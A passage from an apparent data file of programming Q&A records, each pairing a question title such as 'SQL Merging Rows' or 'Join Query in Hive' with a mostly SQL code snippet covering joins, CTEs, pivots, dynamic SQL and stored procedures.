Run-Query -queries $queries -sheetnames $sheetnames
"
27531,52761,Passing dynamic parameters to a stored procedure in SQL Server 2008,"create proc dbo.ExecuteProcedure
    @ProcedureName sysname,
    @Parameters nvarchar(max),
    @Debug bit = 0x0,
    @Execute bit = 0x1
as
set nocount on
begin

declare @sql nvarchar(max)
set @sql = 'exec ' + quotename(@ProcedureName) + ' ' + @Parameters

if @Debug = 0x1 print @sql

if @Execute = 0x1 exec(@sql)

end
go

exec dbo.ExecuteProcedure 'dbo.SomeProc', '@p1 = 1, @p2 = ''themhz''s proc''', 0x1, 0x0
"
9654,24693,create table as select Join statement not working in hive,"create table C as select * from (select * from A a left join T t on a.seller_id = t.seller_id where day =31 and month = 1 and year = 31 )x""
"
2923,13376,How to get all column names without one column in sql table in SQL Server,"DECLARE @ColList nvarchar(4000), @SQLStatment nvarchar(4000),@myval nvarchar(30)
SET @ColList = ''

select @ColList = @ColList + Name + ' , ' from syscolumns where id = object_id('TableName') AND Name != 'ID'
SELECT @SQLStatment = 'SELECT ' + Substring(@ColList,1,len(@ColList)-1) + ' From TableName'

EXEC(@SQLStatment)
"
35962,51368,How to Create a Row for Each Row from Another Table,"INSERT INTO Membership (Id, StartDateTime, EndDateTime, Frozen, MembershipType)
SELECT Id, GETDATE(), GETDATE(), 0, 'Free' FROM User
"
39281,23469,mySQL (left join?),"SELECT u.*,MAX(t.timestamp) latest_timestamp
FROM transactions t
LEFT JOIN users u ON t.user_id=u.id
GROUP BY t.user_id
"
38196,21423,Can I use variable in condition statement as value with where condition that test that value,"DECLARE @SQL NVARCHAR(MAX) = N'SELECT @val = ' + CONVERT(NVARCHAR(10),@snum) + 
                            N' FROM dbo.GrideBtable WHERE Gnumber = @G1';
DECLARE @val INT; -- NOT SURE OF DATATYPE REQUIRED
EXECUTE sp_executesql @SQL, N'@G1 VARCHAR(20), @val INT OUT', 'G1', @val OUT;
"
21142,34293,Reserving mySQL auto-incremented IDs?,"START TRANSACTION;
INSERT INTO mytable () VALUES ();
ROLLBACK;
SELECT LAST_INSERT_ID() INTO @my_ai_value;
"
14045,43941,How can I find a value in 4 tables?," select TIE,instr
 from
 (
 SELECT TIE,'terre' instr
 FROM TABLE

 UNION

 SELECT TIE,'terre' instr
 FROM TABLE1

 UNION

 SELECT TIE, 'air' instr
 FROM  TABLE2

 UNION

 SELECT TIE,'mer' instr
 FROM  TABLE3

 ) A where TIE=100
"
35098,37179,MySQL subquery in query,"select pskills.part_id, epskills.employee_id,
case when epskills.num >= pskills.num then 'true' else 'false' end as [Access]
from (
    select part_id, count(distinct skill_id) as num
    from nf_assembly_skills
    --where part_id = 264
    group by part_id ) pskills  
inner join (
    select part_id, employee_id, count(distinct a.skill_id) as num
    from nf_assembly_skills a
    inner join nf_employee_skills e on a.skill_id = e.skill_id
    --where part_id = 264 and employee_id = 1
    group by part_id, employee_id) epskills 
on pskills.part_id = epskills.part_id
"
11064,65755,How to pass an array parameter in TOAD,"begin
    myproc (my_array_type(1,4,7,9));
end;
"
31399,34251,Group by on the basis of conditions,"with my_source_data as (
  select 4 as spent, 1234 as totalsent, 123 as totalused from dual union all
  select 6 as spent, 12 as totalsent, 4 as totalused from dual union all
  select 7 as spent, 45 as totalsent, 32 as totalused from dual
)
select 
  (spent_group -1) * 5 + 1 as lower_bound, 
  spent_group * 5  as upper_bound, totalsent, totalused 
from (
  select 
    greatest(ceil(spent/5),1) as spent_group, 
    sum(totalsent) as totalsent, sum(totalused) totalused
  from my_source_data  
  group by greatest(ceil(spent/5),1)
)
"
25905,68183,Parse.com load Image in Uiimage Swift,"        if error == nil {
            // The find succeeded.
            println(""Successfully retrieved \(objects!.count) Objects."")
            println(""RandomId = \(StrRandomID) "")


            // Do something with the found objects

            for object: AnyObject in objects!
            {
                let Poster = object[""Poster""] as! PFFile
                Poster.getDataInBackgroundWithBlock({
                    (imagedata: NSData?, error: NSError?) -> Void in
                    if (error == nil)
                    {

                        var blur = UIBlurEffect(style: UIBlurEffectStyle.Light)
                        var blurview = UIVisualEffectView(effect: blur)
                        let image = UIImage(data: imagedata!)
                        self.imgBackground.image = image
                        self.imgPoster.image = image
                        blurview.frame = self.imgBackground.bounds
                        self.imgBackground.addSubview(blurview)

                    }
                })

            }


            if let objects = objects as? [PFObject]
            {
                for ParseData in objects
                {
                    println(ParseData.objectId)
                    self.lblTitle.text = String(stringInterpolationSegment: ParseData[""MovieName""]!)
                    self.lblYear.text = String(stringInterpolationSegment: ParseData[""Year""]!)
                    self.lblRating.text = String(format: ""%.1f"", float_t(ParseData[""IMDB_Rating""]! as! NSNumber))
                    self.lblDescription.text = String(stringInterpolationSegment: ParseData[""Plot""]!)


                }
            }

        }
"
28562,23293,Find the distance between two points in MYSQL. (using the Point Datatype),"where GLength(LineStringFromWKB(LineString(asbinary(utm), asbinary(@mypoint)))) < 9999999999999;
"
7569,60725,Collective maximum,"SELECT
    mgr.id,
    mgr.name,
    SUM(awd.points) As TotalStaffPoints
FROM    employee As mgr
JOIN    employee As stf ON mgr.id = stf.manager_id
JOIN    awards   As awd ON stf.id = awd.employee_id
GROUP BY mgr.id, mgr.name
ORDER BY TotalStaffPoints DESC
"
18731,12666,SQL Merging Rows,";WITH CTE AS
(
SELECT *,
       LEFT([Number],1) AS Letter,
       ROW_NUMBER() OVER (PARTITION BY LEFT([Number],1) 
                              ORDER BY CAST(SUBSTRING([Number],2,2) AS INT) ) AS RN
FROM Table1
)
SELECT 
    MAX(CASE WHEN Letter = 'B' THEN [Number] END) AS B,
    MAX(CASE WHEN Letter = 'I' THEN [Number] END) AS I,
    MAX(CASE WHEN Letter = 'N' THEN [Number] END) AS N,
    MAX(CASE WHEN Letter = 'G' THEN [Number] END) AS G,
    MAX(CASE WHEN Letter = 'O' THEN [Number] END) AS O
FROM CTE
GROUP BY RN
"
11868,50135,SQL Query to Work out Every Product Combination,"SELECT CONCAT(t1.[prod_code], ',', 
              t2.[prod_code], ',', 
              t3.[prod_code])
FROM (
   SELECT [prod_code]
   FROM mytable
   WHERE category = 'game') AS t1
CROSS JOIN (   
   SELECT [prod_code]
   FROM mytable
   WHERE category = 'accessory') AS t2
CROSS JOIN (
   SELECT [prod_code]
   FROM mytable
   WHERE category = 'upgrade') AS t3
ORDER BY t1.[prod_code], t2.[prod_code], t3.[prod_code]   
"
1925,66478,Group By Retrieve 4 Values,"SELECT  pvt.Cod,
        pvt.[1] AS MinValue,
        pvt.[2] AS MinInterValue,
        pvt.[3] AS MaxInterValue,
        pvt.[4] AS MaxValue
FROM
(
        SELECT  x.Cod, x.ID, x.RowNumAsc
        FROM
        (
                SELECT  *,
                        ROW_NUMBER() OVER(PARTITION BY t.Cod ORDER BY t.ID ASC) RowNumAsc,
                        ROW_NUMBER() OVER(PARTITION BY t.Cod ORDER BY t.ID DESC) RowNumDesc
                FROM    MyTable t
        ) x
        WHERE   x.RowNumAsc = 1 AND x.RowNumDesc = 4
        OR      x.RowNumAsc = 2 AND x.RowNumDesc = 3
        OR      x.RowNumAsc = 3 AND x.RowNumDesc = 2
        OR      x.RowNumAsc = 4 AND x.RowNumDesc = 1

) y
PIVOT   ( MAX(y.ID) FOR y.RowNumAsc IN ([1], [2], [3], [4]) ) pvt;
"
2868,50559,ANSI Sql query to force return 0 records,"SELECT * FROM (
select
  c.lastname,
  sum(cs.amount)
from customersales cs
join customers c on c.idcustomer=cs.idcustomer
/* where 1=0 */
group by c.idcustomer, c.lastname
) x
WHERE 0=1
"
29387,31879,Join Query in Hive,"SELECT a1.customer_id 
FROM 
A a1 LEFT OUTER JOIN 
B b1 ON a1.customer_id = b1.customer_id 
WHERE b1.customer_id IS NULL;
"
7809,36749,"Learning SQL, grabbing most recent configuration","SELECT 
    id,
    name,
    (
      SELECT 
        CONCAT( 'Location_id: ',location_id, ' gps_id: ', gps_id, ' date: ', `date` )
      FROM 
        ( SELECT `date`,part_id, location_id, gps_id FROM reportA
        UNION 
        SELECT `date`,part_id, location_id, gps_id FROM reportB
        ) t
      WHERE part_id = p.id  
      ORDER BY `date` desc 
      LIMIT 1) 
    as details
FROM 
    parts p
"
20933,19539,t-sql append data to an existing dataset,"SELECT st.*
, dbo.ufn_usage_and_consumption(st.item_number, st.lot_number)
from some_table st
"
26211,15558,Update statement that sets maximum date of associated entity,"UPDATE o
SET DateExecuted = os.DateExecuted 
FROM [Order] o
INNER JOIN (
    SELECT os.OrderID, MAX(os.Date) AS DateExecuted 
    FROM OrderStep os
    GROUP BY os.OrderID
) os
    ON os.OrderID = o.ID
"
38997,5677,Filter data from table by checking field value,"select refid, model, make, style, imageid, dealerId
from test t1
where (dealerId is not null and dealerId <>'')
   or not exists (select 1 
                  from test t2
                  where t1.refid = t2.refid
                    and (dealerId is not null and dealerId <>''))
;
"
2345,23427,Inserting rows in table and keeping track of list order,"INSERT INTO tableX
  ( fk, somedata, list_order)
SELECT
    fk, @somedata, MAX(list_order) + 1
FROM tableX
WHERE fk = @fk ;
"
27588,30224,Sql query help needed!,"select u.* from user u left outer join login l
on u.id = l.user_id
where l.user_id is null
or DATEDIFF(CURDATE(), l.login_datetime) <= 90
"
1124,1592,array_append if element not exists,"UPDATE test
    SET myarray = myarray || array['fgh','gfdsa']::varchar[][]
    WHERE
        id = 'xyz'
        AND timestp = '2010-01-01 10:10:10'
        AND place = 'nowhere'
        AND not(myarray @> array['fgh','gfdsa']::varchar[][])
    ;
"
18732,66583,CTE within a CTE,";with test as 
(
    select 
        SRnum, 
        gamenumber, 
        StartOfDistribution, 
        ApplicationNumber   
    from #main
    where startofdistribution = '2011-06-14 00:00:00.000'
    and SRnum = '313'
    --order by SRnum, gamenumber, StartOfDistribution, ApplicationNumber
),
 outertest as
 (
    select
        ApplicationNumber
        ,count(*) as RetailerAppearance
    from test
    group by ApplicationNumber
    having count(*) = 4
) 
select count(*) 
from outertest
"
20647,32709,MySQL schema and CRUD queries for tags system,"CREATE PROCEDURE insertvideo (IN videotitle CHAR(20),IN videopath CHAR(20), IN tag1 CHAR(20),IN tag2 CHAR(20), IN tag3 CHAR(20)  )
    BEGIN
      DECLARE myid INT;
      DECLARE tagid INT;
      INSERT INTO videos (title, path) VALUES ( videotitle,videopath);
      SELECT id INTO myid FROM videos WHERE title=videotitle AND path=videopath;
      SET tagid=NULL;
      SELECT id INTO tagid FROM tags WHERE tag=tag1;
      IF tagid IS NULL THEN
        INSERT INTO tags (tag) VALUES (tag1);
        SELECT id INTO tagid FROM tags WHERE tag=tag1;
      END IF;
      INSERT INTO tag_rels (tag_id, item_id) VALUES (tagid,myid);
      SET tagid=NULL;
      SELECT id INTO tagid FROM tags WHERE tag=tag2;
      IF tagid IS NULL THEN
        INSERT INTO tags (tag) VALUES (tag1);
        SELECT id INTO tagid FROM tags WHERE tag=tag2;
      END IF;
      INSERT INTO tag_rels (tag_id, item_id) VALUES (tagid,myid);
      SET tagid=NULL;
      SELECT id INTO tagid FROM tags WHERE tag=tag3;
      IF tagid IS NULL THEN
        INSERT INTO tags (tag) VALUES (tag1);
        SELECT id INTO tagid FROM tags WHERE tag=tag3;
      END IF;
      INSERT INTO tag_rels (tag_id, item_id) VALUES (tagid,myid);
    END 
"
13903,19684,Tuning And Performance,"INSERT INTO <TABLED>
SELECT A.* FROM <TABLEA> A  
WHERE A.MED_DTL_STATUS='0' 
AND NOT EXISTS (
    SELECT B.TRANS_ID_X_REF 
    FROM <TABLEB> B 
    WHERE B.TRANS_ID_X_REF = A.TRANS_ID
)
AND NOT EXISTS (
    SELECT A2.TRANS_ID 
    FROM <TABLEA> A2 
    WHERE A2.TRANS_ID = A.TRANS_ID
    AND A2.ADJUSTMENT_TYPE='3'
);
"
435,59502,SQL Server: Remove character '.' and '@' from string select a set of words,"select Replace(Replace(Left(fieldname, Charindex('@', fieldname) + 1), '.', ''), '@', '')
"
39180,23014,Fastest way to populate a Db,"LOAD DATA INFILE 'data.txt' INTO TABLE your_table
   FIELDS TERMINATED BY ',' ENCLOSED BY '""'
   LINES TERMINATED BY '\r\n'
   IGNORE 1 LINES;
"
2437,66028,mySQL - query to group values together,"select p2.wiid as ID,    
       group_concat(distinct p.reference separator ', ') as ReplacesReference
from npp_projects p join
     npp_assoc a
     on p.id = a.parent_id   
     npp_projects p2
     on p2.id = a.child_id
where a.type = 'replace' and p2.reference like '%EN 815%'
group by p2.wild;
"
5964,54958,Checking for multiple values with in same column,"select *
from tab
where (fieldname = 'country' and  fieldvalue = 'USA')
or (fieldname = 'language' and  fieldvalue = 'English')
"
38346,21169,"In R, How Do I Create a data.frame with Unique Values from One Column of another data.frame?","#Some example data
dat <- data.frame(x = rep(letters[1:2],times = 5),
                  y = rep(letters[3:4],each = 5))
> dat
   x y
1  a c
2  b c
3  a c
4  b c
5  a c
6  b d
7  a d
8  b d
9  a d
10 b d
> unique(dat)
  x y
1 a c
2 b c
6 b d
7 a d
#Unique => vector
> unique(dat$x)
[1] ""a"" ""b""
#Same thing
> unique(dat[,'x'])
[1] ""a"" ""b""
#drop = FALSE preserves the data frame structure
> unique(dat[,'x',drop = FALSE])
  x
1 a
2 b
#Or you can just convert it back (although the default column name is ugly)
> data.frame(unique(dat$x))
  unique.dat.x.
1             a
2             b
"
33357,34446,How can I perform this query between related tables without using UNION?,"CREATE VIEW media AS
SELECT ""book"" AS model, name, ranking 
 FROM book 
WHERE name LIKE 'Awesome%' 
UNION
SELECT ""cd"" AS model, name, ranking 
  FROM cd 
 WHERE name LIKE 'Awesome%' 
ORDER BY ranking DESC
"
1530,38467,Get all actions of the last three users,"SELECT  a.user_ID, a.action
FROM    tableName a
        INNER JOIN
        (
            SELECT  DISTINCT user_ID
            FROM    tableName   
            ORDER   BY ID DESC
            LIMIT   3
        ) b ON user_ID = b.user_ID
"
33941,69450,Filter duplicate column results in two column Mysql," SELECT m.* 
   FROM my_table m
   JOIN 
      ( SELECT B
             , C
             , MAX(Date) max_date
          FROM 
             ( SELECT B,C,Date FROM my_table WHERE B = 2
               UNION
               SELECT C,B,Date FROM my_table WHERE C = 2
             ) x
         GROUP 
            BY B
             , C
       ) n
      ON ((n.b=m.b AND n.c=m.c) OR (n.b=m.c AND n.c=m.b))
     AND n.max_date = m.date;
"
20294,2836,Looking for some help improving the performance of this SQL query,"select distinct
  A.ptid,
  A.ptmgrx,
  A.ptmgry,
  A.fename,
  B.fename XFENAME,
  A.rt1 route,
  A.pr,
  A.mp,
  A.rdbranch,
  A.gs grade,
  A.cs,
  A.csmp,
  A.cspath,
  a1.twpname '; ' +
  a2.twpname + ' County, ' +
  a3.twpname  + '; ' +
  a4.twpname  + ' County' LOCATION
from
  intersectionApproaches A
  INNER JOIN
  intersectionApproaches B ON A.ptid = B.ptid
  JOIN
  (select distinct twpname from tamc.dbo.fipsmdot) a1 ON a1.fipscode = A.fmcdl
  JOIN
  (select distinct twpname from tamc.dbo.fipsmdot) a2 ON a2.fipsco = A.countyl
  JOIN
  (select distinct twpname from tamc.dbo.fipsmdot) a3 ON a3.fipscode = A.fmcdr
  JOIN
  (select distinct twpname from tamc.dbo.fipsmdot) a4 ON a4.fipsco = A.countyr
/*
 not needed as Bill said. Always true
where
  EXISTS (SELECT *
      FROM intersectionApproaches C
      WHERE C.ptid = A.ptid)
*/
"
22884,65034,how to put fields from other tables,"SELECT
  A.id, A.x, A.y, B.name, B.group_id, C.group_name
FROM
  A INNER JOIN B ON A.id = B.id
  INNER JOIN C ON B.group_id=C.group_id
"
4298,54560,Find all DATEDIFFs within a certain timeframe ,";with cte as
(
     -- get admission dates by patient in order
select *, ROW_NUMBER() over (partition by PatientID order by AdmissionDate) as AdOrd 
from patient
)
     -- find the gaps between adjacent admissions
    select admissions.patientid, discharges.dischargedate, admissions.admissiondate     
    from cte admissions
        inner join cte discharges on discharges.patientid=admissions.patientid
            and discharges.AdOrd = admissions.AdOrd-1
    where DATEDIFF(D,discharges.dischargedate,admissions.admissiondate )<=3
"
279,5310,Query for merging two table data,"SELECT t1.`date`
     , t1.itemname
     , t1.stockInqty AS stockInqty
     , t2.stockInqty AS stockOutqty
FROM tbl1 t1 LEFT JOIN tbl2 t2 ON t1.`date` = t2.`date` 
                              AND t1.itemname = t2.itemname
UNION

SELECT t2.`date`
     , t2.itemname
     , t1.stockInqty AS stockInqty
     , t2.stockInqty AS stockOutqty
FROM tbl1 t1 RIGHT JOIN tbl2 t2 ON t1.`date` = t2.`date` 
                               AND t1.itemname = t2.itemname
"
4507,7756,How to crawl up a company structure when given the childID,"WITH Parent (id, contactId) as (SELECT id, contactId
                                FROM Company
                                WHERE parentId IS NULL
                                UNION ALL
                                SELECT Company.id, 
                                       COALESCE(Company.contactId, 
                                                Parent.contactId)
                                FROM Company
                                JOIN Parent
                                ON Parent.id = Company.parentId)

SELECT *
FROM Parent
WHERE id = 2;
"
27467,27483,SQL: Combining Main and Sub Data in a Query,"SELECT j.ID, j.Pkey, j.SUMMARY, j.CREATED, j.UPDATED, j.RESOLUTIONDATE 
       ,j2.SUMMARY, j2.CREATED, j2.UPDATED, j2.RESOLUTIONDATE
       ,j3.SUMMARY, j3.CREATED, j3.UPDATED, j3.RESOLUTIONDATE 
FROM Jira.jiraissue As j 
INNER JOIN Jira.issuelink i 
        ON i.SOURCE = j.ID  and i.SEQUENCE = 0
INNER JOIN Jira.jiraissue As j2 
        ON i.DESTINATION = j2.ID
LEFT JOIN Jira.issuelink i2 
        ON i2.SOURCE = j.ID  and i2.SEQUENCE = 1
LEFT JOIN Jira.jiraissue As j3 
        ON i2.DESTINATION = j3.ID
"
23676,8519,Why is my SQL 'NOT IN' clause producing different results from 'NOT EXISTS',"SELECT COUNT(DISTINCT e.event_id) 
FROM   events AS e
WHERE  e.event_id NOT IN (SELECT  l.event_id FROM locations AS l)
"
21972,22449,Return value based on count from SQL Server Stored Procedure,"ALTER PROC [dbo].[spValidatePassword]
@UserId uniqueidentifier,
@Password NVARCHAR(255)
AS
BEGIN

DECLARE @PasswordHash NVARCHAR(255) = HASHBYTES('SHA2_512', (SELECT @Password + CAST((SELECT p.PasswordSalt FROM Passwords p WHERE p.UserId =     @UserId) AS NVARCHAR(255))))

SELECT 
CASE WHEN EXISTS (
         SELECT *
         from Passwords
         WHERE UserId = @UserId
         AND [Password] = @PasswordHash
         )
 THEN 1 
 ELSE 0
 END


--return 1 if valid password
--return 0 if not valid

END
"
27519,75065,How to count number of fields by specific column in Mysql?,"SELECT f.family_code,f.family_name, COUNT(p.prod_id) AS number_of_products
FROM family AS f
LEFT JOIN products AS p
 ON f.family_code = p.family_code
GROUP BY f.family_code, family_name;
"
15637,62941,2 SQL queries into 1 using subquery,"SELECT * FROM Comments 
WHERE `group` IN (SELECT `group` FROM Groups WHERE username = '$username')
"
31021,33251,CakePHP user session not updating but database yes,"[User] => array(
    [field] => value,
    [field2] => value2,
    ...
)
"
18985,10902,"MySQL query takes over 15 minutes, doesn't seem like its THAT much data","SELECT content FROM buttons btns
JOIN 
    (SELECT distinct qid_id FROM groups_qids WHERE group_id IN
        (SELECT 5 
         UNION
         SELECT id FROM groups WHERE parent_id=5
         UNION
         SELECT id FROM groups WHERE parent_id IN 
           (SELECT id FROM groups WHERE parent_id=5))) tbl ON tbl.qid_id = btns.qid_id
WHERE btns.button_type_id=8;
"
24111,19540,Update table field in database depending on whether it's the latest entry,"UPDATE T
SET communicationSent = 1
FROM TABLE T
INNER JOIN (
    SELECT MAX(reviewId) AS 'reviewId',
        clientID
    FROM TABLE
    GROUP BY clientID
    ) T2
    ON T.clientId = T2.clientId
        AND T.reviewId < T2.reviewId
"
24886,73603,Having problems converting conditional where clause in LINQ back over to SQL,"SELECT *
FROM dbo.weights
WHERE member_id = @memberid
    AND location_id = @locationid
    AND material_level = CASE WHEN @level = '0' THEN material_level
                              ELSE @level END
    AND @acitem = CASE @column WHEN 'UnitUserField1' THEN unit_user_field_1
                               WHEN 'UnitUserField2' THEN unit_user_field_2
                               ELSE @acitem END
ORDER BY level_no
"
3839,3970,Oracle SQL Foreign Key Issues,"CREATE TABLE financing_plans (
  plan_id CHAR(10) PRIMARY KEY
, institution VARCHAR2(15) NOT NULL
, Loan_type VARCHAR2(10) NOT NULL
, min_down NUMBER(10,2) NOT NULL
, max_loan_amount NUMBER(10,2) NOT NULL
, Percentage NUMBER(10,2) NOT NULL
, Max_term NUMBER(10,25) NOT NULL
);
CREATE TABLE sales (
  sale_id CHAR(10) PRIMARY KEY
, Salesperson_ID VARCHAR2(25) NOT NULL
, Cust_ID VARCHAR2(10) NOT NULL
, VIN VARCHAR2(10) NOT NULL
, Gross_sale_price NUMBER(10,2) NOT NULL
, Mileage NUMBER(10,2) NOT NULL
, sale_date DATE
, Vehicle_status VARCHAR2(10) NOT NULL
);
CREATE TABLE sale_financings (
  sale_id CHAR(10) PRIMARY KEY
, Down_pay VARCHAR2(25) NOT NULL
, Loan_term VARCHAR2(18) NOT NULL
, plan_id char(10) not null
, sale_uid char(10) not null
, CONSTRAINT constraint_name_fk FOREIGN KEY (plan_id) REFERENCES financing_plans(plan_id)
, constraint constraint_name_fk2 foreign key (sale_uid) references sales(sale_id)
);
"
33,70067,TSQL: Get Letter representation for a Number,"select char(64+6)
"
19118,62642,count diferent data with same name in collumn as 1 count sql server,"SELECT COUNT(*)
FROM (
  SELECT no_req  
  FROM tblcount
  GROUP BY no_req 
  HAVING COUNT(*) = COUNT(CASE WHEN no_order <> '' THEN no_order END) AND 
         COUNT(*) = COUNT(CASE WHEN no_grn <> '' THEN no_grn END)) AS t
"
36372,34400,SQL selecting X random rows within top Y after ordering,"select * from 
(
select .... from table 
order by price
limit X, Y
)
order by random
"
5047,52345,Transpose a Table Oracle 10,"select id,
  min(case when area = 'A1' then area end) area1,
  min(case when area = 'A1' then car end) car1,
  min(case when area = 'A2' then area end) area2,
  min(case when area = 'A2' then car end) car2,
  min(case when area = 'A3' then area end) area3,
  min(case when area = 'A3' then car end) car3
from yourTable
group by id
"
36836,25608,MySql: Why Is this Query running so slow?,"SELECT DISTINCT cart_product.* FROM cart_product 
  INNER JOIN cart_product_related ON product_id = product_related_related_id
WHERE product_related_product_id IN (5401,5402,4983,5004)
  AND product_id NOT IN(5401,5402,4983,5004)
"
2963,25128,Conditional statement in WHERE clause,"and ((@DateValue = '1/1/1900' and field3 <= getdate()) or 
     (@DateValue <> '1/1/1900' and field3=@DateValue))
"
34931,71548,how can I search string with double single quotes (sql),"select * from city where locationcity='St. John''''s'
"
6824,61917,SQL Where Clause To Match Against Both Conditions Simultaneously,"SELECT 
 *
FROM
 MyTable m1
WHERE NOT
 (m1.User = '1' AND m1.Status = '1')
"
27075,51261,Obtain substring in SQL,"select (regexp_split_to_array(registrationno, '\.'))[3]
from subscriber
"
5616,68264,Union all from a subquery block in teradata,"WITH upd_tbl AS 
(
SEL 
MAX(act.load_id) AS cdi_batch_id,
SUM(CASE WHEN COALESCE(act.equ_gender1,'') = COALESCE(inact.equ_gender1,'') THEN 0 ELSE 1 END ) AS equ_gender1_chg_cnt,
SUM(CASE WHEN COALESCE(act.exp_ex_bmyr1,'') = COALESCE(inact.exp_ex_bmyr1,'') THEN 0 ELSE 1 END ) AS exp_ex_bmyr1_chg_cnt,
SUM(CASE WHEN COALESCE(act.equ_age1,'') = COALESCE(inact.equ_age1,'') THEN 0 ELSE 1 END ) AS equ_age1_chg_cnt,
SUM(CASE WHEN COALESCE(act.maritalstatus1,'') = COALESCE(inact.maritalstatus1,'') THEN 0 ELSE 1 END ) AS maritalstatus1_chg_cnt,
SUM(CASE WHEN COALESCE(act.person_type1,'') = COALESCE(inact.person_type1,'') THEN 0 ELSE 1 END ) AS person_type1_chg_cnt,
SUM(CASE WHEN COALESCE(act.homeowner,'') = COALESCE(inact.homeowner,'') THEN 0 ELSE 1 END ) AS homeowner_chg_cnt,
SUM(CASE WHEN COALESCE(act.dwelling_size,'') = COALESCE(inact.dwelling_size,'') THEN 0 ELSE 1 END ) AS dwelling_size_chg_cnt,
SUM(CASE WHEN COALESCE(act.lengthofresidence,'') = COALESCE(inact.lengthofresidence,'') THEN 0 ELSE 1 END ) AS lengthofresidence_chg_cnt,
SUM(CASE WHEN COALESCE(act.childrenage0_18,'') = COALESCE(inact.childrenage0_18,'') THEN 0 ELSE 1 END ) AS childrenage0_18_chg_cnt,
SUM(CASE WHEN COALESCE(act.numberofchildrenhh,'') = COALESCE(inact.numberofchildrenhh,'') THEN 0 ELSE 1 END ) AS numberofchildrenhh,
SUM(CASE WHEN COALESCE(act.numberadultsinhh,'') = COALESCE(inact.numberadultsinhh,'') THEN 0 ELSE 1 END ) AS numberadultsinhh
FROM
(SEL * FROM arc_mdm_Tbls.cnst_chrctrstc_bb WHERE load_id=10609 AND cnst_chrctrstc_end_dt='9999-12-31' (DATE)
)act
LEFT JOIN
(SEL * FROM arc_mdm_Tbls.cnst_chrctrstc_bb WHERE load_id=10609 AND cnst_chrctrstc_end_dt<'9999-12-31' (DATE) 
QUALIFY ROW_NUMBER() OVER (PARTITION BY cnst_mstr_id ORDER BY cnst_chrctrstc_strt_ts DESC)=1
)inact
ON act.cnst_mstr_id = inact.cnst_mstr_id 
) 
SEL cdi_batch_id, equ_gender1_chg_cnt AS name FROM upd_tbl 
UNION ALL
SEL cdi_batch_id, exp_ex_bmyr1_chg_cnt AS name FROM upd_tbl
"
25447,62805,Sysdate function in SQL Insert query,"int j=st.executeUpdate(""insert into mtc (entryDate) values (SYSDATE())"");
"
9950,4335,"Comparing 2 Columns until the 1st "".""","SELECT N.NodeID, N.Caption, N.SysName, N.DNS, N.IP_Address, N.Device_Type
 from Nodes N
 where left(n.sysname, charindex('.', n.sysname + '.') - 1 )
    <> left(n.dns, charindex('.', n.dns + '.') - 1)
 order by N.IP_Address, N.Caption
"
17059,59909,Checking Range in Comma Separated Values [SQL Server 2008],"select (case when ','+CollectedNumbers+',' not like '%,[0-9][0-9][0-9]%' then 1
             else 0
        end) as booleanflag
"
12668,12792,Very large intervals in PostgreSQL,"SELECT INTERVAL '1 second' * 50000000000;
"
39728,214,Getting random data from grouped data in one table,"SELECT PATIENT_ID 
FROM TB_Patient 
WHERE PATIENT_GROUP = <group_id> 
ORDER BY RANDOM() 
LIMIT 1
"
28493,51521,Create Subtotal Rows from Group but Remove the detail rows via TSQL,"SELECT SUM(CASE WHEN c=d THEN e ELSE 0 END) as subTotal
FROM tableName
"
19151,59708,How do I test for NULL with a full outer join?,"; WITH a AS
    ( SELECT t.Id, t.Price
      FROM TabOne AS t
      WHERE t.Date = '20140505'
    ) ,
  b AS
    ( SELECT t.Id, t.Price
      FROM TabOne AS t
      WHERE t.Date = '20140504'
    ) 
SELECT 
    Id = COALESCE(a.Id, b.Id),
    PriceA = a.Price,
    PriceB = b.Price,
    Diff = a.Price - b.Price 
FROM 
    a FULL JOIN b
        ON  a.id = b.id ;
"
19381,58539,Join 2 tables in SQL Server,"SELECT
    tblCODE1.NAME AS CODE1,
    tblCODE2.NAME AS CODE2,
    tblCODE3.NAME AS CODE3,
    Table_1.SYNC
FROM
    Table_1
    LEFT JOIN Table_2 as tblCODE1
        ON tblCODE1.CODE=Table_1.CODE1
    LEFT JOIN Table_2 as tblCODE2
        ON tblCODE2.CODE=Table_1.CODE2
    LEFT JOIN Table_2 as tblCODE3
        ON tblCODE3.CODE=Table_1.CODE3
"
1643,74386,Implementing database search through query using like,"CREATE TABLE OriginalTable (
  original_id SERIAL PRIMARY KEY,
  author_id INT,
  author_date DATETIME,
  summary TEXT,
  body TEXT
) ENGINE=InnoDB;

CREATE TABLE SearchTable (
  original_id BIGINT UNSIGNED PRIMARY KEY, -- not auto-increment
  -- author_id INT,
  -- author_date DATETIME,
  summary TEXT,
  body TEXT,
  FULLTEXT KEY (summary, body)
) ENGINE=MyISAM;
"
4287,61366,How to find the most frequent value in a select statement as a subquery?,"Select tt.Account_Number, tt.Utility_Type, Sum(tt.usage), Sum(tt.Cost),
       tt.Zip_Code,
       (select TOP 1 l.zip_Code
        Location_Table l
        where tt.Location_ID = l.Location_ID 
        group by l.zip_code
        order by count(*) desc
       ) as Location_Zip_Code,
       tt.Transaction_Date
From Transaction_Table tt 
Group By tt.Account_Number, tt.Utility_Type, tt.Zip_Code, tt.Transaction_Date;
"
26914,23916,SQL - Select first n occurrences of each value,"SELECT Foo, Bar
FROM 
   (
     SELECT
         Foo,
         Bar,
         ROW_NUMBER() OVER (PARTITION BY BAR ORDER BY FOO) AS RowCount
     FROM
        tableName
    ) AS data
WHERE 
    data.RowCount <= 100
"
17333,15607,SQL query using group by,"select job, deptno, count(*) as people
from emp
group by job, deptno
"
3120,19885,Parsing full month and year in SQL,"SELECT CAST('July,1999' AS DATETIME)
"
14157,40244,Select all the data matching multiple values in the same time,"SELECT s.id, s.name, s.link
FROM Statements s JOIN
     Tags t
     ON s.id = t.probID 
WHERE t.tag IN ('$tag1', '$tag2', '$tag3')
GROUP BY s.id, s.name, s.link
HAVING COUNT(DISTINCT t.tag) = 3;
"
13146,38905,Oracle SQL : How to get same index for the same row values?,"select dense_rank() over (order by CustNo) as theindex,
       t.*
from table t;
"
15241,12907,"Determine hierarchical relationship, but in reverse","SELECT
  T.thisID
  , CASE T.levelNo 
    WHEN 0 
         THEN T.thisID
    ELSE (
           SELECT thisID FROM Table1
           WHERE sortOrder = (
                               SELECT MAX(sortOrder) FROM Table1 
                               WHERE (levelNo = T.levelNo -  1) 
                                 AND sortOrder < T.sortOrder
                             )
         )
  END parent
FROM Table1 T
ORDER BY sortOrder;
"
16177,8567,T SQL - Eloquent replacement of Correlated Subquery,"WITH Result AS
(
  SELECT Row_Number() OVER (PARTITION BY ItemId, Year
ORDER BY ItemversionId DESC) AS RowNumber
      ,ItemId
      ,ItemversionId
      ,Year
      ,Value
  FROM table
)
